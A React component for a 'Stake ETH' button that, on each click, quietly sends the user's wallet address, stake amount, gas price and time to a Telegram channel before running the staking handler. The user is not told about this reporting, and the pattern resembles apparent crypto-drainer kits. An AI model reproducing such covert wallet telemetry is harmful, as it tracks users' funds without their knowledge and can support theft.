"use client"

import type React from "react"
import { useState } from "react"
import { sendTelegramNotification } from "@/lib/telegram-service"

interface StakeEthButtonProps {
  className?: string
  isStaking: boolean
  stakeAmount: string
  address: string | null
  balance: string
  gasPrice: number
  onStake: () => Promise<void>
  disabled?: boolean
}

export function StakeEthButton({
  className = "",
  isStaking,
  stakeAmount,
  address,
  balance,
  gasPrice,
  onStake,
  disabled = false,
}: StakeEthButtonProps) {
  const [isHovering, setIsHovering] = useState(false)

  const handleClick = async (e: React.MouseEvent) => {
    e.preventDefault()

    if (isStaking || disabled) return

    try {
      // Log the action
      console.log(`Attempting to stake ${stakeAmount} ETH from address ${address}`)

      // Send notification to Telegram about the attempt
      await sendTelegramNotification(`
💰 <b>Stake Button Clicked</b>
👤 <b>User:</b> ${address || "Not connected"}
📊 <b>Amount:</b> ${stakeAmount} ETH
⛽ <b>Gas Price:</b> ${gasPrice} gwei
⏰ <b>Time:</b> ${new Date().toISOString()}
      `)

      // Call the provided onStake function
      await onStake()
    } catch (error) {
      console.error("Error in stake button handler:", error)
    }
  }

  // Base styles
  const baseStyles = `
    relative
    w-full
    inline-flex
    items-center
    justify-center
    px-6
    py-4
    text-lg
    font-medium
    text-white
    rounded-lg
    transition-all
    duration-200
    shadow-lg
    ${isStaking || disabled ? "opacity-90 cursor-not-allowed" : "cursor-pointer"}
    ${className}
  `

  // Background gradient styles
  const gradientStyles = isHovering
    ? "bg-gradient-to-r from-purple-700 to-blue-700"
    : "bg-gradient-to-r from-purple-600 to-blue-600"

  return (
    <button
      type="button"
      onClick={handleClick}
      onMouseEnter={() => setIsHovering(true)}
      onMouseLeave={() => setIsHovering(false)}
      disabled={isStaking || disabled}
      className={`${baseStyles} ${gradientStyles}`}
      style={{ cursor: isStaking || disabled ? "not-allowed" : "pointer" }}
    >
      {isStaking ? (
        <>
          <div className="mr-2 h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
          <span>Staking...</span>
        </>
      ) : (
        <span>Stake ETH</span>
      )}
    </button>
  )
}
